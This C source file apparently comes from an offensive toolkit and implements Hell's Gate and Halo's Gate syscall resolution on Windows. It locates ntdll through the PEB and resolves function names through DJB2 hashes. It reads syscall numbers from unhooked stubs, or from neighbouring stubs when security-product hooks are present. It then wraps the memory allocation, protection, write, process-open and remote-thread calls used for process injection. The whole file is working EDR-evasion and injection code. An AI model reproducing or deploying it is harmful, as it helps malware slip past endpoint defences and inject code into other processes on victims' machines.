#include "syscalls.h"

// We need PEB structures for walking the module list.
// Instead of including <winternl.h> (which redefines OBJECT_ATTRIBUTES/CLIENT_ID),
// we define the minimal PEB structures we need here.

typedef struct _MY_UNICODE_STRING2 {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} MY_UNICODE_STRING2;

typedef struct _MY_PEB_LDR_DATA {
	BYTE       Reserved1[8];
	PVOID      Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} MY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
	PVOID              Reserved1[2];
	LIST_ENTRY         InMemoryOrderLinks;
	PVOID              Reserved2[2];
	PVOID              DllBase;
	PVOID              Reserved3[2];
	MY_UNICODE_STRING2 FullDllName;
	// ... more fields we don't need
} MY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
	BYTE              Reserved1[2];
	BYTE              BeingDebugged;
	BYTE              Reserved2[1];
	PVOID             Reserved3[2];
	MY_PEB_LDR_DATA*  Ldr;
	// ... more fields we don't need
} MY_PEB;

/*
 * Global SSN for HellDescent (set before each syscall)
 */
WORD wSSN = 0;

/*
 * DJB2 Hashing function (seed = 0x35)
 */
DWORD64 DJB2(PBYTE str) {
	DWORD64 dwHash = 0x35;
	INT c;
	while ((c = *str++))
		dwHash = ((dwHash << 5) + dwHash) + c;
	return dwHash;
}

/*
 * Get ntdll.dll base address from PEB (avoids GetModuleHandle)
 */
PVOID GetNtDllBase() {
#if defined(_WIN64)
	MY_PEB* pPeb = (MY_PEB*)__readgsqword(0x60);
#else
	MY_PEB* pPeb = (MY_PEB*)__readfsdword(0x30);
#endif
	// First entry is the EXE itself, second is ntdll.dll
	LIST_ENTRY* pHead = &pPeb->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* pEntry = pHead->Flink;

	while (pEntry != pHead) {
		MY_LDR_DATA_TABLE_ENTRY* pLdr = (MY_LDR_DATA_TABLE_ENTRY*)pEntry;
		if (pLdr->FullDllName.Buffer && wcsstr(pLdr->FullDllName.Buffer, L"ntdll.dll"))
			return pLdr->DllBase;
		pEntry = pEntry->Flink;
	}
	return NULL;
}

/*
 * Find Export Directory of a PE module
 */
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase +
		pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	return TRUE;
}

/*
 * Hell's Gate / Halo's Gate: Resolve SSN from Export Address Table
 *
 * Hell's Gate: If the function is NOT hooked, the first bytes are:
 *   4C 8B D1    mov r10, rcx
 *   B8 xx xx    mov eax, <SSN>
 *
 * Halo's Gate: If hooked (starts with E9 = JMP), scan neighboring
 *   syscall stubs (+/- 32 bytes each) to find an unhooked one,
 *   then calculate our SSN from the offset.
 */
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions  = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames      = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD  pwAddressOfNameOrdinal = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PVOID)((PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinal[cx]]);

		if (DJB2((PBYTE)pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;
			PBYTE pByte = (PBYTE)pFunctionAddress;

			// --- Hell's Gate: function is NOT hooked ---
			if (pByte[0] == 0x4C && pByte[1] == 0x8B && pByte[2] == 0xD1 && pByte[3] == 0xB8) {
				pVxTableEntry->wSSN = (pByte[5] << 8) | pByte[4];
				return TRUE;
			}

			// --- Halo's Gate: function IS hooked (JMP = 0xE9) ---
			if (pByte[0] == 0xE9) {
				for (WORD idx = 1; idx <= 500; idx++) {
					// Check neighbor above (higher address)
					PBYTE pUp = pByte + (idx * 32);
					if (pUp[0] == 0x4C && pUp[1] == 0x8B && pUp[2] == 0xD1 && pUp[3] == 0xB8) {
						pVxTableEntry->wSSN = ((pUp[5] << 8) | pUp[4]) - idx;
						return TRUE;
					}
					// Check neighbor below (lower address)
					PBYTE pDown = pByte - (idx * 32);
					if (pDown[0] == 0x4C && pDown[1] == 0x8B && pDown[2] == 0xD1 && pDown[3] == 0xB8) {
						pVxTableEntry->wSSN = ((pDown[5] << 8) | pDown[4]) + idx;
						return TRUE;
					}
				}
			}

			return FALSE; // Found function but couldn't extract SSN
		}
	}
	return FALSE; // Function not found in EAT
}

/*
 * Initialize all VxTable entries (resolve all SSNs at startup)
 */
BOOL InitializeVxTable(PVX_TABLE pVxTable) {
	PVOID pNtDllBase = GetNtDllBase();
	if (!pNtDllBase) return FALSE;

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pNtDllBase, &pImageExportDirectory)) return FALSE;

	pVxTable->NtAllocateVirtualMemory.dwHash = HASH_NtAllocateVirtualMemory;
	if (!GetVxTableEntry(pNtDllBase, pImageExportDirectory, &pVxTable->NtAllocateVirtualMemory)) return FALSE;

	pVxTable->NtProtectVirtualMemory.dwHash = HASH_NtProtectVirtualMemory;
	if (!GetVxTableEntry(pNtDllBase, pImageExportDirectory, &pVxTable->NtProtectVirtualMemory)) return FALSE;

	pVxTable->NtWriteVirtualMemory.dwHash = HASH_NtWriteVirtualMemory;
	if (!GetVxTableEntry(pNtDllBase, pImageExportDirectory, &pVxTable->NtWriteVirtualMemory)) return FALSE;

	pVxTable->NtOpenProcess.dwHash = HASH_NtOpenProcess;
	if (!GetVxTableEntry(pNtDllBase, pImageExportDirectory, &pVxTable->NtOpenProcess)) return FALSE;

	pVxTable->NtCreateThreadEx.dwHash = HASH_NtCreateThreadEx;
	if (!GetVxTableEntry(pNtDllBase, pImageExportDirectory, &pVxTable->NtCreateThreadEx)) return FALSE;

	return TRUE;
}

/*
 * Syscall Wrappers: Set the global SSN, then call HellDescent (asm stub)
 */
NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, PVX_TABLE_ENTRY pEntry) {
	wSSN = pEntry->wSSN;
	return HellDescent(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection, PVX_TABLE_ENTRY pEntry) {
	wSSN = pEntry->wSSN;
	return HellDescent(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
}

NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten, PVX_TABLE_ENTRY pEntry) {
	wSSN = pEntry->wSSN;
	return HellDescent(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS SysNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId, PVX_TABLE_ENTRY pEntry) {
	wSSN = pEntry->wSSN;
	return HellDescent(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList, PVX_TABLE_ENTRY pEntry) {
	wSSN = pEntry->wSSN;
	return HellDescent(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaxStackSize, AttributeList);
}
